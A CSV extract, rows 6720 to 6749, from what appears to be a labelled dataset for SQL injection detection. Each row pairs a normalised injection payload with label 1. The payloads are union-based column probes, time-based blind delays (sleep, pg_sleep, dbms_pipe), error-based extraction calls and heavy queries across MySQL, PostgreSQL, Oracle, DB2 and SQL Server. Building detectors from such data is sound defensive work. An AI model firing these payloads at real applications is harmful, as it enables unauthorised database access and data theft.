row_index,payload_norm,label,sqli_type_hint
6720,"1'+ ( select 'rpbx' where 6748 = 6748 and elt ( 4249 = 4249,7259 ) ) +'",1,
6721,"-5573' ) union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1,
6722,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1,
6723,"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
6724,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1,
6725,"-5652%' ) union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1,
6726,1 ) where 6884 = 6884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
6727,"1' or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
6728,"1"" ) ) as zgig where 5748 = 5748 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
6729,1'|| ( select 'zwcp' where 3333 = 3333,1,
6730,select ( case when ( 8916 = 1357 ) then 8916 else 8916* ( select 8916 from information_schema.character_sets ) end ) #,1,
6731,"-1303' union all select 4840,4840#",1,
6732,"1%' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6733,1' ) where 7541 = 7541,1,
6734,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'cfzp' like 'cfzp",1,
6735,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'vtoi' like 'vtoi,1,
6736,-8397' ) ) ) or 2171 = 4788,1,
6737,"-8203"" ) union all select 6394,6394,6394,6394,6394--",1,
6738,"1%' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( '%' = '",1,
6739,"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""hbgr"" like ""hbgr",1,
6740,"1"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""ajuh"" = ""ajuh",1,
6741,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",1,
6742,-3535%' ) ) ) or 5605 = 4660 and ( ( ( '%' = ',1,
6743,"1 ) where 5378 = 5378 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
6744,1'+ ( select 'zgtu' where 8419 = 8419,1,
6745,1 ) ) ) and 8990 = 4775 and ( ( ( 1894 = 1894,1,
6746,end and ( '%' = ',1,
6747,"1"" where 5406 = 5406 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,
6748,"-3865"" ) where 3559 = 3559 union all select 3559,3559,3559,3559,3559,3559,3559--",1,
6749,1%' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( '%' = ',1,
